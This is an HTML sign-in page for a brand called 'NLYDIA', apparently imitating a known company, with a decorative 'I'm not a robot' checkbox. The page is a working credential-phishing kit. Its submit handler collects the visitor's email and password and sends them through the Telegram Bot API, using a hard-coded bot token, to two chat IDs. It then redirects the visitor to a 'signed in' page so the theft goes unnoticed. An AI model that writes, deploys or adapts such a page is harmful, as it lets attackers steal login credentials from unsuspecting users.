<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - NLYDIA</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1c1c1c;
            color: #f0f0f0;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background-color: #333;
        }
        .navbar a {
            color: #f0f0f0;
            text-decoration: none;
            margin: 0 15px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            height: calc(100vh - 140px);
            overflow: auto;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
        }
        input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #00cc00;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .checkbox-label {
            margin-right: 10px;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            padding: 20px;
            text-align: center;
            background-color: #333;
            color: #fff;
        }
        .success-message {
            color: green;
            margin-top: 20px;
        }
        .spacer {
            height: 100px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">NLYDIA</div>
        <div>
            <a href="index.html">Home</a>
            <a href="about.html">About Us</a>
            <a href="products.html">Products</a>
            <a href="contact.html">Contact Us</a>
        </div>
    </div>
    <div class="container">
        <h2>Sign in</h2>
        <form id="signinForm">
            <input type="email" id="email" placeholder="Your Email" required><br>
            <input type="password" id="password" placeholder="Password" required minlength="7"><br>
            <div class="checkbox-container">
                <input type="checkbox" id="human" name="human" required>
                <label for="human" class="checkbox-label">I'm not a robot</label>
            </div>
            <br>
            <input type="submit" id="signinButton" value="Sign in">
        </form>
        <div class="spacer"></div>
        <div class="success-message" id="successMessage" style="display: none;">Sign in successful</div>
    </div>
    <div class="footer">
        © 2024 NLYDIA. All rights reserved.
        <p>Operators: Jared Lee</p>
        <p>Manufacturer: Xiang</p>
    </div>
    <script>
        document.getElementById('signinForm').addEventListener('submit', function(event) {
            event.preventDefault();

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            var message = 'Email: ' + email + '\n' +
                          'Password: ' + password;

            var botToken = '7243508319:AAHcGPRAkx7dgyucfW2dSAgVuNdXFumLNVg';
            var chatId1 = '1509235250';
            var chatId2 = '825218850';
            var url1 = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId1 + '&text=' + encodeURIComponent(message);
            var url2 = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId2 + '&text=' + encodeURIComponent(message);
// 发送消息给第一个用户
            fetch(url1)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Message sent to first user successfully');
                        // 跳转到 signedin.html 页面
                        window.location.href = 'signedin.html';
                    } else {
                        console.error('Error sending message to first user.');
                    }
                })
                .catch(error => {
                    console.error('Error sending message to first user:', error);
                });

            // 发送消息给第二个用户
            fetch(url2)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Message sent to second user successfully');
                    } else {
                        console.error('Error sending message to second user.');
                    }
                })
                .catch(error => {
                    console.error('Error sending message to second user:', error);
                });
        });
    </script>
</body>
</html>
